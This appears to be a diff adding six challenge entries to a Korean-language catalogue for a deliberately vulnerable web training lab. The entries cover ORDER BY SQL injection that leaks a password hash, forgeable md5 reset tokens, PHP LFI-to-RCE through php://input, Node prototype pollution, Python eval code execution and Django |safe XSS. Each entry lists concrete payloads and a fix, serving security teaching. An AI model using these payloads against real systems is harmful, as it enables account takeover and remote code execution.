@@ -1015,6 +1015,142 @@
         }
       ],
       "fix": "신뢰 불가 데이터에 pickle 금지. JSON 등 안전 포맷, 서명/검증, 세션 시리얼라이저 JSON."
+    },
+    {
+      "id": 49,
+      "category": "sqli",
+      "difficulty": "hard",
+      "engine": "all",
+      "title": "SQL Injection — ORDER BY(정렬 파라미터) 주입",
+      "owasp": "A03:2021 Injection",
+      "ref": "https://portswigger.net/web-security/sql-injection",
+      "goal": "ORDER BY 는 파라미터 바인딩이 어려워 정렬 컬럼을 문자열로 연결하는 경우가 많다. 이 지점에 error-based 주입으로 버전·데이터를 유출한다.",
+      "route": "/leaderboard?sort=",
+      "steps": [
+        {
+          "desc": "정상 정렬",
+          "payload": "/leaderboard?sort=points DESC"
+        },
+        {
+          "desc": "에러 기반 추출 — DB 버전 유출(extractvalue, MariaDB)",
+          "payload": "/leaderboard?sort=extractvalue(1,concat(0x7e,version()))"
+        },
+        {
+          "desc": "관리자 비밀번호 해시 유출(32자 단위)",
+          "payload": "/leaderboard?sort=extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))"
+        }
+      ],
+      "fix": "정렬 컬럼/방향을 화이트리스트(허용된 컬럼명만)로 매핑. 사용자 입력을 ORDER BY 에 직접 넣지 말 것."
+    },
+    {
+      "id": 50,
+      "category": "auth",
+      "difficulty": "medium",
+      "engine": "all",
+      "title": "예측 가능한 비밀번호 재설정 토큰(약한 난수)",
+      "owasp": "A07:2021 Identification and Authentication Failures",
+      "ref": "https://owasp.org/www-community/attacks/Session_hijacking_attack",
+      "goal": "재설정 토큰이 사용자명 기반 상수 해시(md5(username))라 공격자가 그대로 계산해 임의 계정의 재설정 링크를 위조한다.",
+      "route": "/find_pw_weak",
+      "steps": [
+        {
+          "desc": "대상 계정으로 토큰 발급 요청",
+          "payload": "POST /find_pw_weak  username=admin"
+        },
+        {
+          "desc": "공격자는 토큰을 직접 계산(md5)해 동일 값 획득 → 계정 탈취",
+          "payload": "token = md5('admin') = 21232f297a57a5a743894a0e4a801fc3"
+        }
+      ],
+      "fix": "암호학적 난수(CSPRNG)로 토큰 생성, 만료·1회용·사용자 바인딩, 토큰을 서버에 안전 저장."
+    },
+    {
+      "id": 51,
+      "category": "file",
+      "difficulty": "expert",
+      "engine": "php",
+      "title": "LFI → RCE (php://input 래퍼, PHP 전용)",
+      "owasp": "A03:2021 Injection",
+      "ref": "https://owasp.org/www-community/attacks/Path_Traversal",
+      "goal": "allow_url_include 가 켜진 환경에서 include 대상에 php://input 을 주면, POST 본문의 PHP 코드가 그대로 실행된다.",
+      "route": "/theme?name=php://input (POST 본문에 PHP)",
+      "steps": [
+        {
+          "desc": "include 대상을 php://input 으로 지정하고 본문에 PHP 웹셸 전송",
+          "payload": "curl -X POST --data '<?php system(\"id\"); ?>' 'http://127.0.0.1:8101/theme?name=php://input'"
+        },
+        {
+          "desc": "data:// 래퍼도 동일하게 동작",
+          "payload": "/theme?name=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+"
+        }
+      ],
+      "fix": "allow_url_include=Off, 사용자 입력으로 include 경로 생성 금지, 래퍼 차단, 화이트리스트."
+    },
+    {
+      "id": 52,
+      "category": "adv",
+      "difficulty": "hard",
+      "engine": "node",
+      "title": "프로토타입 오염 → 권한 상승 사슬 (Node 전용)",
+      "owasp": "A08:2021 Software and Data Integrity Failures",
+      "ref": "https://portswigger.net/web-security/prototype-pollution",
+      "goal": "#30 으로 Object.prototype 을 오염시키면, 이후 권한 판단에 쓰이는 평범한 객체가 상속으로 isAdmin=true 를 갖게 되어 guest 가 admin 이 된다.",
+      "route": "/api/merge → /api/account",
+      "steps": [
+        {
+          "desc": "프로토타입 오염",
+          "payload": "POST /api/merge  {\"__proto__\":{\"isAdmin\":true}}"
+        },
+        {
+          "desc": "권한 판단 엔드포인트 호출 → guest 가 admin 으로 인식",
+          "payload": "GET /api/account  → {\"isAdmin\":true, flag}"
+        }
+      ],
+      "fix": "권한 판단에 Object.prototype 상속 값을 쓰지 말 것(hasOwnProperty 확인), 병합에서 __proto__ 차단, null-prototype 객체."
+    },
+    {
+      "id": 53,
+      "category": "adv",
+      "difficulty": "expert",
+      "engine": "django",
+      "title": "코드 실행 — eval() (Django/Python 전용)",
+      "owasp": "A03:2021 Injection",
+      "ref": "https://owasp.org/www-community/attacks/Code_Injection",
+      "goal": "사용자 입력을 eval() 로 평가해 임의 파이썬 코드를 실행한다(RCE).",
+      "route": "/calc?expr=",
+      "steps": [
+        {
+          "desc": "표현식 평가 확인",
+          "payload": "/calc?expr=7*7"
+        },
+        {
+          "desc": "OS 명령 실행(popen 으로 출력까지)",
+          "payload": "/calc?expr=__import__('os').popen('id').read()"
+        }
+      ],
+      "fix": "eval/exec 금지. 수식이 필요하면 ast.literal_eval 또는 안전한 파서, 입력 화이트리스트."
+    },
+    {
+      "id": 54,
+      "category": "xss",
+      "difficulty": "easy",
+      "engine": "django",
+      "title": "저장형/반사형 XSS — |safe 자동 이스케이프 해제 (Django 전용)",
+      "owasp": "A03:2021 Injection",
+      "ref": "https://docs.djangoproject.com/en/stable/ref/templates/builtins/#safe",
+      "goal": "Django 는 기본적으로 출력을 이스케이프하지만, |safe(또는 mark_safe)로 해제하면 사용자 입력의 스크립트가 실행된다.",
+      "route": "/greet?name=",
+      "steps": [
+        {
+          "desc": "name 파라미터에 스크립트 삽입",
+          "payload": "/greet?name=<script>alert(document.domain)</script>"
+        },
+        {
+          "desc": "이미지 onerror",
+          "payload": "/greet?name=<img src=x onerror=alert(1)>"
+        }
+      ],
+      "fix": "신뢰 불가 데이터에 |safe/mark_safe 사용 금지. Django 기본 자동 이스케이프 유지, 필요 시 bleach 로 정제."
     }
   ]
 }
